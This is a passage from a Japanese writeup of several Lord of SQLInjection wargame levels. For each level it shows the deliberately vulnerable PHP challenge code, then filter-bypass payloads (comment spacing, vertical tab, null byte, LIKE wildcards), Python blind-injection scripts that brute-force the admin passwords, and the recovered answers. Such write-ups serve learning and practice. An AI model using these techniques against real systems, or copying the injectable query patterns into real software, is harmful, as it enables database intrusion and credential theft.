  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_bugbear where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and no=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>no<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select pw from prob_bugbear where id='admin' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;bugbear&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="考察-13"><a href="#考察-13" class="header-anchor">#</a> 考察</h3> <p>pwの文字数は以下のように確かめる．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>query : <span class="token keyword">select</span> id <span class="token keyword">from</span> prob_bugbear <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">and</span> <span class="token keyword">no</span><span class="token operator">=</span><span class="token number">100</span><span class="token comment">/**/</span><span class="token operator">||</span><span class="token comment">/**/</span>id<span class="token comment">/**/</span><span class="token operator">in</span><span class="token comment">/**/</span><span class="token punctuation">(</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token operator">&amp;&amp;</span><span class="token comment">/**/</span>length<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token operator">in</span><span class="token comment">/**/</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>先ほどのスクリプトを用いたいが，orがエスケープされるのでord関数が使えない．
hex関数を用いるとよい．
以下がスクリプト．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">'https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php'</span>
mycookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">''</span>
<span class="token punctuation">}</span>
letters <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
ans <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?pw=1&amp;no=1/**/||/**/id/**/in/**/(&quot;admin&quot;)/**/'</span> <span class="token operator">+</span> <span class="token string">&quot;%26&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;%26&quot;</span> <span class="token operator">+</span> <span class="token string">'/**/hex(mid(pw,{index},1))/**/in/**/(hex(&quot;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index <span class="token operator">=</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> letter <span class="token operator">+</span> <span class="token string">'&quot;))%23'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>mycookie<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Hello admin'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> letter
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="回答-13"><a href="#回答-13" class="header-anchor">#</a> 回答</h3> <p>得られたパスワードを使う．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_bugbear <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">'735c2773'</span> <span class="token operator">and</span> <span class="token keyword">no</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="giant"><a href="#giant" class="header-anchor">#</a> giant</h2> <h3 id="問題-14"><a href="#問題-14" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>shit<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ |\n|\r|\t/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>shit<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select 1234 from<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>shit<span class="token punctuation">]</span><span class="token punctuation">}</span></span>prob_giant where 1&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token number">1234</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;giant&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="考察-14"><a href="#考察-14" class="header-anchor">#</a> 考察</h3> <p>以下の制約がある．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>shit<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ |\n|\r|\t/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>shit<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>スペース，改行，タブが使えない．</p> <h3 id="回答-14"><a href="#回答-14" class="header-anchor">#</a> 回答</h3> <p>垂直タブ（%0b）を用いたら，通ってしまった．</p> <h2 id="assassin"><a href="#assassin" class="header-anchor">#</a> assassin</h2> <h3 id="問題-15"><a href="#問題-15" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_assassin where pw like '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;assassin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="考察-15"><a href="#考察-15" class="header-anchor">#</a> 考察</h3> <p>likeが用いられている．
ワイルドカード（%や_）を用いる．
%は，任意数の文字列に対応するワイルドカード．
_は,1文字に対応するワイルドカード．
文字数を_で確認すると，8文字だが，Hello guestと出力される．
adminとguestのpwは両方とも8文字だと考えてすすめる．</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_assassin where pw like '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>1文字ずつ当てていく．
以下のスクリプトを書いた．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">'https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php'</span>
mycookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'ee20toc74hj5a407ravn5but60'</span>
<span class="token punctuation">}</span>
letters <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
ans <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>letter<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?pw='</span> <span class="token operator">+</span> ans <span class="token operator">+</span> <span class="token string">'{index}%'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index <span class="token operator">=</span> letter<span class="token punctuation">)</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>mycookie<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Hello guest'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token string">'Hello admin'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> letter
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="回答-15"><a href="#回答-15" class="header-anchor">#</a> 回答</h3> <p>得られたパスワードを使う．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>query : <span class="token keyword">select</span> id <span class="token keyword">from</span> prob_assassin <span class="token keyword">where</span> pw <span class="token operator">like</span> <span class="token string">'832edd10'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="zombie-assassin"><a href="#zombie-assassin" class="header-anchor">#</a> zombie_assassin</h2> <h3 id="問題-16"><a href="#問題-16" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\\\|prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\\\|prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">ereg</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">ereg</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_zombie_assassin where id='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;zombie_assassin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="考察-16"><a href="#考察-16" class="header-anchor">#</a> 考察</h3> <p>NULLバイトアタックですね．
ereg関数の脆弱性として検査する文字列中にNULL文字が含まれていると，NUll文字よりあとの文字列は検査されないというものがあります．これを利用します．</p> <h3 id="回答-16"><a href="#回答-16" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_zombie_assassin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">#' and pw=''</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="succubus"><a href="#succubus" class="header-anchor">#</a> succubus</h2> <h3 id="問題-17"><a href="#問題-17" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_succubus where id='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;succubus&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
